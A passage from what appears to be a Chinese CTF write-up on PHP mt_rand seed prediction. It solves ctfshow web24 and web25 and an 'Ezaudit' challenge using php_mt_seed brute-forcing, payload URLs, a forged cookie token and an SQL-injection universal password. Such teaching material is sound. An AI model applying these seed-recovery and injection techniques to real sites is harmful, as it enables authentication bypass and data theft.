class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br>mt_srand(<span class="hljs-number">12345</span>);    <br><span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-meta">?&gt;</span>    <br></code></pre></td></tr></table></figure><p>代码运行结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">第一次运行结果：   <br><span class="hljs-number">162946439</span><br><span class="hljs-number">247161732</span><br><span class="hljs-number">1463094264</span><br><span class="hljs-number">1878061366</span><br><span class="hljs-number">394962642</span><br>  <br>第二次运行结果：   <br><span class="hljs-number">162946439</span><br><span class="hljs-number">247161732</span><br><span class="hljs-number">1463094264</span><br><span class="hljs-number">1878061366</span><br><span class="hljs-number">394962642</span><br>  <br>第三次运行结果：   <br><span class="hljs-number">162946439</span><br><span class="hljs-number">247161732</span><br><span class="hljs-number">1463094264</span><br><span class="hljs-number">1878061366</span><br><span class="hljs-number">394962642</span><br></code></pre></td></tr></table></figure><p>无论运行多少次，结果都是一样的。当种子不变时，实际上生成的随机数是固定的。而这就是伪随机数漏洞</p><h2 id="得到相同的种子"><a href="#得到相同的种子" class="headerlink" title="得到相同的种子"></a>得到相同的种子</h2><p>这里有个trick是,可以通过Keep-Alive HTTP头,迫使服务端使用同一PHP进程相应请求,所以也就能使种子保持一直.</p><p>别的就依赖PHP程序员出错了.</p><h2 id="常见题型"><a href="#常见题型" class="headerlink" title="常见题型"></a>常见题型</h2><h3 id="1-根据种子预测随机数"><a href="#1-根据种子预测随机数" class="headerlink" title="1.根据种子预测随机数"></a>1.根据种子预测随机数</h3><p>根据题中所给的种子生成随机数</p><p><strong>ctfshow-web入门-web24</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$r</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>];<br>    mt_srand(<span class="hljs-number">372619038</span>);<br>    <span class="hljs-keyword">if</span>(intval(<span class="hljs-variable">$r</span>)===intval(mt_rand()))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">echo</span> system(<span class="hljs-string">&#x27;cat /proc/version&#x27;</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>显然是伪随机数，编写php脚本用种子生成随机数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>mt_srand(<span class="hljs-number">372619038</span>);<br><span class="hljs-keyword">echo</span> mt_rand();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>运行得到随机数1155388967</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">Paylaod: ?r=<span class="hljs-number">1155388967</span><br><span class="hljs-comment">#ctfshow&#123;14824218-bc8e-452e-a581-e910df8f1cab&#125;</span><br></code></pre></td></tr></table></figure><h3 id="2-根据随机数预测种子"><a href="#2-根据随机数预测种子" class="headerlink" title="2.根据随机数预测种子"></a>2.根据随机数预测种子</h3><p>既然知道了,同一个种子生成的序列是固定的,那么也能根据序列猜测seed</p><p>工具:php_mt_seed:<a href="https://github.com/lepiaf/php_mt_seed">https://github.com/lepiaf/php_mt_seed</a><br>Linux下安装使用方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">git <span class="hljs-keyword">clone</span> https:<span class="hljs-comment">//github.com/openwall/php_mt_seed.git</span><br>cd php_mt_seed/<br>gcc php_mt_seed.c -o php_mt_seed<br>make<br></code></pre></td></tr></table></figure><p>使用方法 ./php_mt_seed 随机数</p><p>先用种子123456生成一个随机数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br>mt_srand(<span class="hljs-number">12345</span>);    <br><span class="hljs-keyword">echo</span> mt_rand();<br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure><p>得到随机数162946439，然后使用php_mt_seed工具查找种子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">┌──(kali㉿kali)-[~/php_mt_seed/php_mt_seed-main]<br>└─$ ./php_mt_seed <span class="hljs-number">162946439</span><br>Pattern: EXACT<br>Version: <span class="hljs-number">3.0</span><span class="hljs-number">.7</span> to <span class="hljs-number">5.2</span><span class="hljs-number">.0</span><br>Found <span class="hljs-number">0</span>, trying <span class="hljs-number">0xfc000000</span> - <span class="hljs-number">0xffffffff</span>, speed <span class="hljs-number">103.5</span> Mseeds/s <br>Version: <span class="hljs-number">5.2</span><span class="hljs-number">.1</span>+<br>Found <span class="hljs-number">0</span>, trying <span class="hljs-number">0x00000000</span> - <span class="hljs-number">0x01ffffff</span>, speed <span class="hljs-number">0.0</span> Mseeds/s <br>seed = <span class="hljs-number">0x00003039</span> = <span class="hljs-number">12345</span> (PHP <span class="hljs-number">5.2</span><span class="hljs-number">.1</span> to <span class="hljs-number">7.0</span>.x; HHVM)<br>Found <span class="hljs-number">1</span>, trying <span class="hljs-number">0x04000000</span> - <span class="hljs-number">0x05ffffff</span>, speed <span class="hljs-number">0.9</span> Mseeds/s <br>seed = <span class="hljs-number">0x05efcd66</span> = <span class="hljs-number">99601766</span> (PHP <span class="hljs-number">7.1</span><span class="hljs-number">.0</span>+)<br></code></pre></td></tr></table></figure><p>这个12345就是我们上面设置的种子</p><p><strong>注意：php_mt_seed 工具只能用于爆破mt_rand()函数产生的随机数的种子值， 无论是否显式调用mt_srand()函数播种，但不能用于mt_rand(1,1000)这种指定范围的和rand函数的爆破</strong></p><p><strong>ctfshow-web入门-web25</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$r</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>];<br>    mt_srand(hexdec(substr(md5(<span class="hljs-variable">$flag</span>), <span class="hljs-number">0</span>,<span class="hljs-number">8</span>)));<br>    <span class="hljs-variable">$rand</span> = intval(<span class="hljs-variable">$r</span>)-intval(mt_rand());<br>    <span class="hljs-keyword">if</span>((!<span class="hljs-variable">$rand</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$rand</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">echo</span> system(<span class="hljs-string">&#x27;cat /proc/version&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>审计代码知道我们传入的参数减去生成的mt_rand()要等于0才能进入下一个判断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$rand</span> = intval(<span class="hljs-variable">$r</span>)-intval(mt_rand());<br></code></pre></td></tr></table></figure><p>mt_rand()未知，但是当判断不正确时，会输出$rand，尝试反推出mt_srand。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?r=<span class="hljs-number">0</span><br><span class="hljs-number">-214290638</span><br></code></pre></td></tr></table></figure><p>此时rand=-214290638，所以得到mt_rand=214290638，</p><p>通过抓包查看响应头我们可以知道该php版本为7.3.11,接下来爆破种子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php">┌──(kali㉿kali)-[~/php_mt_seed/php_mt_seed-main]<br>└─$ time ./php_mt_seed <span class="hljs-number">214290638</span>                                                                                                                                               <span class="hljs-number">130</span> ⨯<br>Pattern: EXACT<br>Version: <span class="hljs-number">3.0</span><span class="hljs-number">.7</span> to <span class="hljs-number">5.2</span><span class="hljs-number">.0</span><br>Found <span class="hljs-number">0</span>, trying <span class="hljs-number">0xb8000000</span> - <span class="hljs-number">0xbbffffff</span>, speed <span class="hljs-number">81.9</span> Mseeds/s <br>seed = <span class="hljs-number">0xba9c3466</span> = <span class="hljs-number">3130799206</span> (PHP <span class="hljs-number">3.0</span><span class="hljs-number">.7</span> to <span class="hljs-number">5.2</span><span class="hljs-number">.0</span>)<br>seed = <span class="hljs-number">0xba9c3467</span> = <span class="hljs-number">3130799207</span> (PHP <span class="hljs-number">3.0</span><span class="hljs-number">.7</span> to <span class="hljs-number">5.2</span><span class="hljs-number">.0</span>)<br>Found <span class="hljs-number">2</span>, trying <span class="hljs-number">0xfc000000</span> - <span class="hljs-number">0xffffffff</span>, speed <span class="hljs-number">81.2</span> Mseeds/s <br>Version: <span class="hljs-number">5.2</span><span class="hljs-number">.1</span>+<br>Found <span class="hljs-number">2</span>, trying <span class="hljs-number">0x2e000000</span> - <span class="hljs-number">0x2fffffff</span>, speed <span class="hljs-number">0.9</span> Mseeds/s <br>seed = <span class="hljs-number">0x2f5150d3</span> = <span class="hljs-number">793858259</span> (PHP <span class="hljs-number">5.2</span><span class="hljs-number">.1</span> to <span class="hljs-number">7.0</span>.x; HHVM)<br>Found <span class="hljs-number">3</span>, trying <span class="hljs-number">0xbe000000</span> - <span class="hljs-number">0xbfffffff</span>, speed <span class="hljs-number">0.7</span> Mseeds/s <br>seed = <span class="hljs-number">0xbefdafcd</span> = <span class="hljs-number">3204296653</span> (PHP <span class="hljs-number">5.2</span><span class="hljs-number">.1</span> to <span class="hljs-number">7.0</span>.x; HHVM)<br>Found <span class="hljs-number">4</span>, trying <span class="hljs-number">0xd4000000</span> - <span class="hljs-number">0xd5ffffff</span>, speed <span class="hljs-number">0.7</span> Mseeds/s <br>seed = <span class="hljs-number">0xd4414cf6</span> = <span class="hljs-number">3561049334</span> (PHP <span class="hljs-number">5.2</span><span class="hljs-number">.1</span> to <span class="hljs-number">7.0</span>.x; HHVM)<br>seed = <span class="hljs-number">0xd4414cf6</span> = <span class="hljs-number">3561049334</span> (PHP <span class="hljs-number">7.1</span><span class="hljs-number">.0</span>+)<br></code></pre></td></tr></table></figure><p>得到种子3561049334</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>mt_srand(<span class="hljs-number">3561049334</span>);<br><span class="hljs-variable">$r</span>=mt_rand();<br><span class="hljs-variable">$token</span>=mt_rand()+mt_rand();<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$r</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$token</span>;<br><br><span class="hljs-number">214290638</span><br><span class="hljs-number">2311762511</span><br></code></pre></td></tr></table></figure><p>Payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?r=<span class="hljs-number">214290638</span> <br>Cookie: token=<span class="hljs-number">2311762511</span><br></code></pre></td></tr></table></figure><p><strong>Ezaudit</strong></p><p>源码泄露，访问/<a href="http://www.zip可下载源码/">www.zip可下载源码</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>header(<span class="hljs-string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);<br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;login&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-variable">$Private_key</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Private_key&#x27;</span>];<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$username</span> == <span class="hljs-string">&#x27;&#x27;</span>) || (<span class="hljs-variable">$password</span> == <span class="hljs-string">&#x27;&#x27;</span>) ||(<span class="hljs-variable">$Private_key</span> == <span class="hljs-string">&#x27;&#x27;</span>)) &#123;<br>        <span class="hljs-comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span><br>        header(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>&#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$Private_key</span> != <span class="hljs-string">&#x27;*************&#x27;</span> )<br>    &#123;<br>        header(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$Private_key</span> === <span class="hljs-string">&#x27;************&#x27;</span>)&#123;<br>        <span class="hljs-variable">$getuser</span> = <span class="hljs-string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>.<span class="hljs-string">&#x27;;&#x27;</span>; <br>        <span class="hljs-variable">$link</span>=mysql_connect(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);<br>        mysql_select_db(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-variable">$link</span>);<br>        <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$getuser</span>);<br>        <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=mysql_fetch_assoc(<span class="hljs-variable">$result</span>))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;username&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;flag&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>    &#125;<br><br>&#125; <br><span class="hljs-comment">// genarate public_key </span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">public_key</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">16</span></span>) </span>&#123;<br>    <span class="hljs-variable">$strings1</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$public_key</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++ )<br>    <span class="hljs-variable">$public_key</span> .= substr(<span class="hljs-variable">$strings1</span>, mt_rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-variable">$strings1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$public_key</span>;<br>  &#125;<br><br>  <span class="hljs-comment">//genarate private_key</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">private_key</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">12</span></span>) </span>&#123;<br>    <span class="hljs-variable">$strings2</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$private_key</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++ )<br>    <span class="hljs-variable">$private_key</span> .= substr(<span class="hljs-variable">$strings2</span>, mt_rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-variable">$strings2</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$private_key</span>;<br>  &#125;<br>  <span class="hljs-variable">$Public_key</span> = public_key();<br>  <span class="hljs-comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span><br></code></pre></td></tr></table></figure><p>在源码中看到有个login.html<br><img src="https://img-blog.csdnimg.cn/e3784f580fc14df084166469a4501ee0.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="img"><br>继续看代码，输入账号密码以及私钥，用户名已知是<code>crispr</code>了，接下来密码和私钥输对了就能得到flag。密码可以直接用万能密码1’ or ‘1’=’1  来绕过，主要获取私钥。</p><p>私钥和公钥的生成都用到了mt_rand()，而公钥的值已经给出了是<code>$Public_key = KVQP0LdJKRaV3n9D</code>，那么我们就可以根据这个公钥推算出种子，然后再根据种子得到私钥。</p><p>先要把公钥转换成php_mt_seed可识别的参数，用文档中给的脚本<a href="https://github.com/openwall/php_mt_seed">pw2args.php</a>进行转换</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php">php版<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$allowable_characters</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br><span class="hljs-variable">$len</span> = strlen(<span class="hljs-variable">$allowable_characters</span>) - <span class="hljs-number">1</span>;<br><span class="hljs-variable">$pass</span> = <span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; strlen(<span class="hljs-variable">$pass</span>); <span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-variable">$number</span> = strpos(<span class="hljs-variable">$allowable_characters</span>, <span class="hljs-variable">$pass</span>[<span class="hljs-variable">$i</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$number</span> <span class="hljs-subst">$number</span> 0 <span class="hljs-subst">$len</span> &quot;</span>;<br> &#125;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br> <span class="hljs-meta">?&gt;</span><br><br><br>python版<br>str1 =<span class="hljs-string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span><br>str2 = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span><br>res =<span class="hljs-string">&#x27;&#x27;</span><br>length = str(len(str2)<span class="hljs-number">-1</span>)<br><span class="hljs-keyword">for</span> i in range(len(str1)):<br>    <span class="hljs-keyword">for</span> j in range(len(str2)):<br>        <span class="hljs-keyword">if</span> str1[i] ==  str2[j]:<br>            res += str(j) + <span class="hljs-string">&#x27; &#x27;</span> +str(j) + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-string">&#x27;0&#x27;</span> + <span class="hljs-string">&#x27; &#x27;</span> + length + <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">break</span><br><span class="hljs-keyword">print</span>(res)<br></code></pre></td></tr></table></figure><p>运行得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/php_mt_seed/php_mt_seed-main]<br>└─$ php pw2args.php KVQP0LdJKRaV3n9D                                                                                <br>36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61<br><br>┌──(kali㉿kali)-[~/php_mt_seed/php_mt_seed-main]<br>└─$ python3 p.py<br>36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61<br></code></pre></td></tr></table></figure><p>然后使用php_mt_seed爆破种子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">┌──(kali㉿kali)-[~/php_mt_seed/php_mt_seed-main]<br>└─$ time ./php_mt_seed <span class="hljs-number">36</span> <span class="hljs-number">36</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">47</span> <span class="hljs-number">47</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">42</span> <span class="hljs-number">42</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">52</span> <span class="hljs-number">52</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">37</span> <span class="hljs-number">37</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">3</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">35</span> <span class="hljs-number">35</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">36</span> <span class="hljs-number">36</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">43</span> <span class="hljs-number">43</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">47</span> <span class="hljs-number">47</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">55</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">13</span> <span class="hljs-number">13</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">61</span> <span class="hljs-number">61</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">29</span> <span class="hljs-number">29</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <br>Pattern: EXACT-<span class="hljs-keyword">FROM</span><span class="hljs-number">-62</span> EXACT-<span class="hljs-keyword">FROM</span><span class="hljs-number">-62</span> EXACT-<span class="hljs-keyword">FROM</span><span class="hljs-number">-62</span> EXACT-<span class="hljs-keyword">FROM</span><span class="hljs-number">-62</span> EXACT-<span class="hljs-keyword">FROM</span><span class="hljs-number">-62</span> EXACT-<span class="hljs-keyword">FROM</span><span class="hljs-number">-62</span> EXACT-<span class="hljs-keyword">FROM</span><span class="hljs-number">-62</span> EXACT-<span class="hljs-keyword">FROM</span><span class="hljs-number">-62</span> EXACT-<span class="hljs-keyword">FROM</span><span class="hljs-number">-62</span> 